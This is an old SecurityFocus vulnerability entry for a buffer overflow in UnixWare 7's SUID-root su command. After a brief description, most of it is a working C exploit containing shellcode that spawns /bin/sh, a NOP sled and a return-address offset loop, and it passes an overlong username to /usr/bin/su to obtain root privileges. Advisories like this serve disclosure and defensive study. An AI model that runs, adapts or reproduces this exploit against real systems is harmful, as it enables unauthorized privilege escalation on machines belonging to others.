source: http://www.securityfocus.com/bid/826/info

Certain versions of Unixware ship with a version of su(1) which is vulnerable to a buffer overflow attack. This attack is possible because su(1) fails to sanity check user supplied data, in this instance a username supplied on the command line. Because su(1) is SUID root this attack may result in root privileges. 

// UnixWare7 /usr/bin/su local, K2, revisited Oct-30-1999
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shell[] =
 "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
 "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
 "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
 "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
 "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
 "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";

const char x86_nop=0x90;
long nop,esp;
long offset=DEFOFF;
char buffer[SIZE];

long get_esp() { __asm__("movl %esp,%eax"); }

int main (int argc, char *argv[])
{
    register int i;

    if (argc > 1) offset += strtol(argv[1], NULL, 0);
    if (argc > 2) nop += strtoul(argv[2], NULL, 0);
    else
        nop = NOPDEF;
    esp = get_esp();

    memset(buffer, x86_nop, SIZE);
    memcpy(buffer+nop, shell, strlen(shell));

    for (i = nop+strlen(shell); i < SIZE-4; i += 4)
        *((int *) &buffer[i]) = esp+offset;

    printf("offset = [0x%x]\n",esp+offset);
    execl("/usr/bin/su", "su", buffer, NULL);

    printf("exec failed!\n");
    return 0;
}
